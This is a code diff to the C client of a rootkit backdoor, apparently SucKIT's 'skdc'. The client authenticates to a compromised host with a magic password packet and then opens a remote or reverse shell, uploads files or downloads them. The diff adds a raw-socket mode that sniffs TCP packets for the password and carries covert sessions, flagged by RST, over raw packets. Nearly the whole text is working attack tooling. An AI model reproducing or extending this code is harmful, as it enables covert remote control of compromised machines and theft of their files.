@@ -6,55 +6,62 @@
 #include <sys/stat.h>
 #include <fcntl.h>
 #include <arpa/inet.h>
-#include <actions.h>
 #include <netdb.h>
-#include <config.h>
 #include <termios.h>
 #include <errno.h>
 #include <stdlib.h>
 
+#include "raw.h"
+#include "config.h"
+#include "actions.h"
+
+struct rawsock r;
+
 int usage(char *s) {
-    printf("Usage: %s -a {shell|down|up|check|listen} -h ip/hostname -l local_port -d dest_port [-f file] [-r]\n"
-        "   -a: command to execute\n"
+    printf("skdc - <whats[@t]wekk.net>\n"
+           "==========================\n"
+        "Usage:\n\n"
+        "%s -a {shell|down|up|check|listen} -h ip/hostname -l local_port -d dest_port [-f file] [-r]\n"
+        "   -a: action to execute\n"
         "      * shell => launches a shell (-hd required)\n"
         "      * down => download a file (-hdf required)\n"
         "      * up => uploads a file (-hdf required)\n"
         "      * check => check if suckit is running on remote host (-hd required)\n"
         "      * listen => listens for a tty (-l required)\n"
-		"   -r: launch the same command but in reverse mode (-l required)\n"
+		"   -r: direct raw mode (disables reverse mode)\n"
 		"   -h: host or ip address\n"
-		"   -l: local port to listen\n"
+		"   -l: local port to listen (enables reverse mode and disables raw mode)\n"
 		"   -d: destination port to send magic\n"
         "   -f: file to upload or download\n"
         ,s);
 	return -1;
 }
 
-void do_action(int action, int sock, char *file) {
+void do_action(int action, int rsock, int wsock, char *file) {
     switch(action) {
         case UPLOAD:
             printf("Uploading file\n");
-            client_upload(sock, file);
+            client_upload(rsock, wsock, file);
             break;
         case DOWNLOAD:
             printf("Downloading file\n");
-            client_download(sock, file);
+            client_download(rsock, wsock, file);
             break;
         case SHELL:
-            printf("Launching shell\n");
-            client_shell(sock);
+            printf("Launching shell rsock: %d, wsock: %d\n", rsock, wsock);
+            client_shell(rsock, wsock);
             break;
         case RUPLOAD:
             printf("Reverse uploading file\n");
-            client_upload(sock, file);
+            client_upload(rsock, wsock, file);
             break;
         case RDOWNLOAD:
             printf("Reverse downloading file\n");
-            client_download(sock, file);
+            client_download(rsock, wsock, file);
             break;
         case RSHELL:
             printf("Launching reverse shell\n");
-            client_shell(sock);
+            client_shell(rsock, wsock);
             break;
         default:
             printf("Invalid option: %d\n", action);
@@ -62,7 +69,7 @@ void do_action(int action, int sock, char *file) {
 }
 
 // Client actions
-int client_shell(int sock) {
+int client_shell(int rsock, int wsock) {
     struct termios oldterm, newterm; 
     char buf[BUFSIZE];
 
@@ -78,20 +85,20 @@ int client_shell(int sock) {
 
         FD_ZERO(&fds);
         FD_SET(0, &fds);
-        FD_SET(sock, &fds);
+        FD_SET(rsock, &fds);
         errno = 0;
-        if (select(sock + 1, &fds, NULL, NULL, NULL) < 0 && (errno != EINTR)) break;
+        if (select(rsock + 1, &fds, NULL, NULL, NULL) < 0 && (errno != EINTR)) break;
 
         /* stdin => shell */
         if (FD_ISSET(0, &fds)) {
             int count = read(0, buf, BUFSIZE);
             if (count <= 0 && (errno != EINTR)) break;
-            if (write(sock, buf, count) <= 0 && (errno != EINTR)) break;
+            if (write(wsock, buf, count) <= 0 && (errno != EINTR)) break;
         }
 
         /* shell => stdout */
-        if (FD_ISSET(sock, &fds)) {
-            int count = read(sock, buf, BUFSIZE);
+        if (FD_ISSET(rsock, &fds)) {
+            int count = read(rsock, buf, BUFSIZE);
             if (count <= 0 && (errno != EINTR)) break;
             if (write(1, buf, count) <= 0 && (errno != EINTR)) break;
         }
@@ -99,12 +106,13 @@ int client_shell(int sock) {
 
     tcsetattr(0, TCSAFLUSH, &oldterm);
     perror("Connection disappeared");
-    close(sock);
+    close(rsock);
+    close(wsock);
 
 	return 0;
 }
 
-int client_upload(int sock, char *file) {
+int client_upload(int rsock, int wsock, char *file) {
     int fd, bytes;
     char buf[BUFSIZE];
     unsigned long size, transfered;
@@ -118,7 +126,7 @@ int client_upload(int sock, char *file) {
         transfered = 0;
         printf("Size: %lu bytes\n", size);
         while ((bytes = read(fd, &buf, BUFSIZE)) > 0) {
-            if ((transfered += write(sock, &buf, bytes)) < bytes) {
+            if ((transfered += write(wsock, &buf, bytes)) < bytes) {
                 printf("ERROR AL LLEGIR!\n");
             } else  {
                 printf("\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\bUploaded: %u%%", (transfered/(1+(size/100))));
@@ -131,7 +139,7 @@ int client_upload(int sock, char *file) {
     return 0;
 }
 
-int client_download(int sock, char *file) {
+int client_download(int rsock, int wsock, char *file) {
     int fd, bytes;
     char buf[BUFSIZE];
     char *ptr = strrchr(file, '/');
@@ -142,7 +150,7 @@ int client_download(int sock, char *file) {
         perror("open");
     } else {
         bytes = 0;
-        while ((bytes = read(sock, &buf, BUFSIZE)) > 0) {
+        while ((bytes = read(rsock, &buf, BUFSIZE)) > 0) {
             if (write(fd, &buf, bytes) < bytes) {
                 printf("ERROR AL LLEGIR!\n");
             }
@@ -223,13 +231,49 @@ void start_daemon(int action, int port, char *file) {
 
     printf("Received connection!\n");
 
-    do_action(action, sock_con, file);
+    do_action(action, sock_con, sock_con, file);
 
     exit(0);
 }
 
+void raw_daemon() {
+    int sock;
+    struct sockaddr_in raw;
+    unsigned int slen = sizeof(raw);
+    struct packet p;
+    int size;
+
+    sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
+    if (sock < 0) {
+        printf("Can't allocate raw socket\n");
+        exit(-1);
+    }
+
+    // TODO: evaluar si és millor un sniffer (mode promiscuo) o això (CPU)
+    while (1) {
+        size = recvfrom(sock, &p, sizeof(p), 0, (struct sockaddr *) &raw, &slen);
+        //        debug("Rebut: %d bytes port %d - %d\n", size, ntohs(p.tcp.dest), ntohs(p.tcp.source));
+        //    if (ntohs(p.tcp.dest) == 2222) {
+        //        debug("Rebut: %d bytes ports %d -> %d\n", size, ntohs(p.tcp.source), 2222);
+        //    }
+        // Si el tamany del paquet es el que toca
+        if (size == sizeof(struct packet)) {
+            // I el password és correcte
+            if (!memcmp(SERVERAUTH, p.action.pass, 20)) {
+                //printf("S'ha rebut el paquet d'autenticacio correctament (action: %d)\n", p.action.action);
+                //If has the RESET flag, is a direct raw packet
+                if (p.tcp.rst) {
+                    //printf("packet de sessio RAW (%d bytes)\n", p.action.size);
+                    fill_raw_connection(&r, p.action.bytes, p.action.size);
+                }
+            }
+        }
+    }
+}
+
+
 int main(int argc, char *argv[]) {
-	int opt, local_port = -1, dest_port = -1, action = -1, reverse = 0;
+	int opt, local_port = -1, dest_port = -1, action = -1, reverse = 0, raw = 0;
 	char *host = 0, *cmd, *file = 0;
     unsigned long ip;
 //    char ipname[256];
@@ -251,6 +295,8 @@ int main(int argc, char *argv[]) {
 				host = optarg;
 				break;
             case 'l':
+                reverse = 1;
+                raw = 0;
                 if (sscanf(optarg, "%u\n", &local_port) != 1)
                     return usage(argv[0]);
                 break;
@@ -262,7 +308,8 @@ int main(int argc, char *argv[]) {
                 file=optarg;
                 break;
 			case 'r':
-				reverse = 1;
+				raw = 1;
+                reverse = 0;
 				break;
             default:
                 usage(argv[0]);
@@ -290,7 +337,7 @@ int main(int argc, char *argv[]) {
     }
 
 	// Launch daemon if is a reverse command
-	if (reverse || action == LISTEN) {
+	if (reverse) {
         switch (action) {
             case UPLOAD: action = RUPLOAD; break;
             case DOWNLOAD: action = RDOWNLOAD; break;
@@ -300,9 +347,7 @@ int main(int argc, char *argv[]) {
         start_daemon(action, local_port, file);
         // Wait some time
         sleep(2);
-	}
 
-    if (action != LISTEN) {
         // TODO: retry several times 
 
         // Connect to skd
@@ -321,7 +366,7 @@ int main(int argc, char *argv[]) {
         }
 
         // Generate packet
-        memcpy(cmdpkt.pass, PASSWORD, strlen(PASSWORD));
+        memcpy(cmdpkt.pass, CLIENTAUTH, strlen(CLIENTAUTH));
         cmdpkt.port = local_port;
         cmdpkt.action = action;
         memcpy(cmdpkt.bytes, file, strlen(file));
@@ -331,9 +376,32 @@ int main(int argc, char *argv[]) {
         if (reverse) {
             close(sock);
         } else {
-            do_action(action, sock, file);
+            do_action(action, sock, sock, file);
             close(sock);    
         }
+    } else if (raw) {
+        if (!getuid()) {
+            pipe(r.r);
+            pipe(r.w);
+            r.initialized = 1;
+            
+            if (!fork()) raw_daemon();
+            launcher_directraw(&r, ip, local_port, dest_port, CLIENTAUTH);
+
+            // Generate packet
+            memcpy(cmdpkt.pass, CLIENTAUTH, strlen(CLIENTAUTH));
+            cmdpkt.port = local_port;
+            cmdpkt.action = action;
+            cmdpkt.size = 0;
+            memcpy(cmdpkt.bytes, file, strlen(file));
+            send_raw(ip, local_port, dest_port, (unsigned char *)&cmdpkt, sizeof(struct data), 1);
+            send_raw(ip, local_port, dest_port, (unsigned char *)&cmdpkt, sizeof(struct data), 0);
+
+            do_action(action, r.r[0], r.w[1], file);
+        } else {
+            printf("You need root acces for the raw mode\n");
+        }
     }
+
 	return 0;
 }
